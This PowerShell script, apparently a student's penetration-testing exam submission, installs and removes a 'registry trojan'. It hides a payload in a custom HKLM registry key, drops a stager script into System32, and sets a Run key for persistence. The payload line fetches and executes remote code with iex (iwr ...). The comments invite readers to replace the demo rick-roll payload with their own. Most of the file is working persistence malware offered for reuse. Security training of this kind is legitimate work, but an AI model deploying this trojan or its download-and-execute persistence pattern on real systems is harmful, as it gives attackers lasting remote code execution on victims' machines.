## Powershell For Penetration Testers Exam Task 10 - A Trojan that lives in the registry, reads and writes to the Win Reg for it's commands

function Install-Trojan
{

<#
.SYNOPSIS
PowerShell cmdlet for installing the regkey trojan
.DESCRIPTION
this script installs a trojan whos main execution payload will live in a custom regestry key. It will then also set up an autorun key to call a powershell script which acts as a stager for pulling the payload out of memory. Current payload is a joke / ascii rick-roll, please replace with your own playloads
.EXAMPLE
PS C:\> Install-Trojan -name ahhh
.LINK
https://github.com/ahhh/PSSE/master/blob/RegTrojan.ps1
http://lockboxx.blogspot.com/2016/03/registry-trojan-powershell-for.html
http://www.codeproject.com/Articles/223002/Reboot-and-Resume-PowerShell-Script
https://social.technet.microsoft.com/Forums/windowsserver/en-US/d8c094ac-4b8e-4caf-9456-0a3482d62898/running-a-powershell-script-from-the-registry?forum=winserverpowershell
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3061
#>

	[CmdletBinding()] Param(
	
		[Parameter(Mandatory = $false, ValueFromPipeline=$true)]
		[Alias("n", "reg")]
		[String]
		$name = 'hsg'
	
	)
	
	$payload = "iex (iwr http://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1 )"
	$RegRunKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
	
	Push-Location

	Set-Location HKLM:

	if ((Test-Path .\Software\$name) -eq $False)
	{

		# The regkey where our trojan payload is stored
		New-Item -Path .\Software -Name $name -Value $payload
		
		# Determine the value of the persistence key item
		$command = "`$cmd = (Get-ItemProperty HKLM:\Software\$name).'(default)';   powershell.exe -executionpolicy unrestricted -sta -Command `$cmd"
		# Write this script out to a file
		Write-Output $command > "C:\Windows\System32\$name.ps1"
		#$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
		#$encodedCommand = [Convert]::ToBase64String($bytes)
		$run = "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -noprofile -sta -File `"C:\Windows\System32\$name.ps1`""
		
		# Set the persistence regkey where we call our trojan from
		Set-ItemProperty -Path $RegRunKey -Name $name -Value $run
	
		#Set-Item -Path HKCU:\Software\$name -Value $payload
		
		Pop-Location
		
		Write-Output "Success!"
		
	}
	else{
		Write-Output "Failed :("
	}
}

function Uninstall-Trojan
{

<#
.SYNOPSIS
PowerShell cmdlet for uninstalling the regkey trojan
.DESCRIPTION
this script uninstalls the regTrojan by removing the 3 files it places on disk for persistence
.EXAMPLE
PS C:\> Uninstall-Trojan -name ahhh
.LINK
https://github.com/ahhh/PSSE/master/blob/RegTrojan.ps1
http://lockboxx.blogspot.com/2016/03/registry-trojan-powershell-for.html
http://www.codeproject.com/Articles/223002/Reboot-and-Resume-PowerShell-Script
https://social.technet.microsoft.com/Forums/windowsserver/en-US/d8c094ac-4b8e-4caf-9456-0a3482d62898/running-a-powershell-script-from-the-registry?forum=winserverpowershell
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3061
#>

	[CmdletBinding()] Param(
	
		[Parameter(Mandatory = $false, ValueFromPipeline=$true)]
		[Alias("n", "reg")]
		[String]
		$name = 'hsg'
	
	)

	$RegRunKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
	
	Push-Location

	Set-Location HKLM:

	if ((Test-Path .\Software\$name) -eq $True)
	{

		# Remove trojan payload
		Remove-Item -Path .\Software\$name
		# Remove trojan persistence
		Remove-ItemProperty -Path $RegRunKey -Name $name
		# Remove our script location
		rm "C:\Windows\System32\$name.ps1"
	
		#Set-Item -Path .\Software\$name -Value $payload
		
		Pop-Location
		
		Write-Output "Success!"
		
	} else{
		Write-Output "Failed :("
	}
}
